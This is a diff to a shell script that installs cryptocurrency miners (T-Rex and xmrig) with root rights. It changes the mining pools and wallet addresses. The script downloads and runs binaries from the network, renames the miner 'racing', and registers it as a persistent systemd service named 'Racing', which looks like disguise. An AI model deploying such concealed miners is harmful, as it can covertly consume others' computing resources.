@@ -24,7 +24,7 @@ sudo nvidia-smi mig -cgi 0 -C
 sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
 sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
 sudo mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u ARyaz2psdKU58yVrtLzPMYAQc5hG3EPV1G."'${myworker}_One_'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AHxt4DaEvNjpNyTi6E5UsaP1ERKYCDZgY8."'${myworker}_One_'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AHxt4DaEvNjpNyTi6E5UsaP1ERKYCDZgY8.${myworker}_One_ -p x &
@@ -33,9 +33,9 @@ if [[ $noCore -eq 6 ]]
 then
 	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
 	sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
-	sudo ./xmrig-6.16.2/xmrig -o xtcash.trrxitte.com -u solo:cashctCevReKVH8tWbpzywjp8KdRNRCN9hsYUAUR3b6ACDUQMxq6w4njHfshSYgimUi4LuHwZXwePU1MCCn5K6Yc5uaqEUCz5z -p test -k -a argon2/chukwa -t= ${usingcore} 
+	sudo ./xmrig-6.16.2/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHYR2TAeqLmKxmFuajteVeQwubM8Fm9PLVmHqREGVqDtfth7Y4ZHQVzVAd5ZKgNkJqBaVxFvVnGJnsYXEPev77SFG1Zn1z9EF4u -p "c1" --coin zephyr -a rx/0 -t= ${usingcore} 
 else
 	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
 	sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
-	sudo ./xmrig-6.16.2/xmrig -o xtcash.trrxitte.com -u solo:cashctCevReKVH8tWbpzywjp8KdRNRCN9hsYUAUR3b6ACDUQMxq6w4njHfshSYgimUi4LuHwZXwePU1MCCn5K6Yc5uaqEUCz5z -p test -k -a argon2/chukwa -t= ${usingcore} &
+	sudo ./xmrig-6.16.2/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHYR2TAeqLmKxmFuajteVeQwubM8Fm9PLVmHqREGVqDtfth7Y4ZHQVzVAd5ZKgNkJqBaVxFvVnGJnsYXEPev77SFG1Zn1z9EF4u -p "c2" --coin zephyr -a rx/0 -t= ${usingcore} &
 fi
